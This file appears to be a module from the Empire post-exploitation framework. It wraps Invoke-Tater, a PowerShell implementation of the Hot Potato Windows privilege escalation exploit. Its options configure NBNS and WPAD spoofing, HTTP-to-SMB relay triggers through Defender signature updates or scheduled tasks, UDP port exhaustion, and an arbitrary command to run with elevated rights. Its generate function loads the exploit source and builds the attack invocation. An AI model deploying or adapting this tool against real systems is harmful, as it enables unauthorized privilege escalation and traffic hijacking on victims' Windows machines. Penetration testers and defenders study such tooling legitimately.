from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Tater',

            'Author': ['Kevin Robertson'],

            'Description': ('Tater is a PowerShell implementation of the Hot Potato '
			    'Windows Privilege Escalation exploit from @breenmachine and @foxglovesec '
			    '@foxglovesec.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/Kevin-Robertson/Tater'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' 		  : {
                'Description'     :   'Agent to run module on.',
                'Required'        :   True,
                'Value'           :   ''
            },
            'IP'      		  : {
                'Description'     :   'Local IP address.',
                'Required'        :   False,
                'Value'           :   ''
            },
	    'SpooferIP'       	  : {
                'Description'     :   'IP address included in NBNS response.',
                'Required'        :   False,
                'Value'           :   ''
            },
            'Command'     	  : {
                'Description'     :   'Command to execute during privilege escalation. Do not wrap command in quotes.',
                'Required'        :   True,
                'Value'           :   ''
            },
	    'NBNS'            	  : {
                'Description'     :   'Enable/Disable NBNS bruteforce spoofing (Y/N).',
                'Required'        :   False,
                'Value'           :   'Y'
            },
	    'NBNSLimit'                : {
                'Description'     :   'Enable/Disable NBNS bruteforce spoofer limiting to stop NBNS spoofing while hostname is resolving correctly (Y/N).',
                'Required'        :   False,
                'Value'           :   'Y'
            },
            'Trigger' 		  : {
                'Description'     :   'Trigger type to use in order to trigger HTTP to SMB relay. 0 = None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled Task',
                'Required'        :   False,
                'Value'           :   '1'
            },
	    'ExhaustUDP' 	  : {
                'Description'     :   'Enable/Disable UDP port exhaustion to force all DNS lookups to fail in order to fallback to NBNS resolution (Y/N).',
                'Required'        :   False,
                'Value'           :   'N'
            },
	    'HTTPPort'            : {
                'Description'     :   'TCP port for the HTTP listener.',
                'Required'        :   False,
                'Value'           :   '80'
            },
	    'Hostname'            : {
                'Description'     :   'Hostname to spoof. "WPAD.DOMAIN.TLD" is required by Windows Server 2008.',
                'Required'        :   False,
                'Value'           :   'WPAD'
            },
	    'WPADDirectHosts'     : {
                'Description'     :   'Comma separated list of hosts to include as direct in the wpad.dat file. Note that localhost is always listed as direct. Add the Empire host to avoid Tater catching Empire HTTP traffic.',
                'Required'        :   False,
                'Value'           :   ''
            },
	    'WPADPort' 	  	  : {
                'Description'     :   'Proxy server port to be included in the wpad.dat file.',
                'Required'        :   False,
                'Value'           :   ''
            },
	    'Taskname' 	  	  : {
                'Description'     :   'Scheduled task name to use with trigger 2',
                'Required'        :   False,
                'Value'           :   'Empire'
            },
	    'RunTime' 	  	  : {
                'Description'     :   'Run time duration in minutes.',
                'Required'        :   False,
                'Value'           :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-Tater.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # disable file output
        script += "\n" + 'Invoke-Tater -ConsoleOutput "Y" -Tool "2" '

	for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            script += " -" + str(option) + " " + quoted
                        else:
                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""

        return script
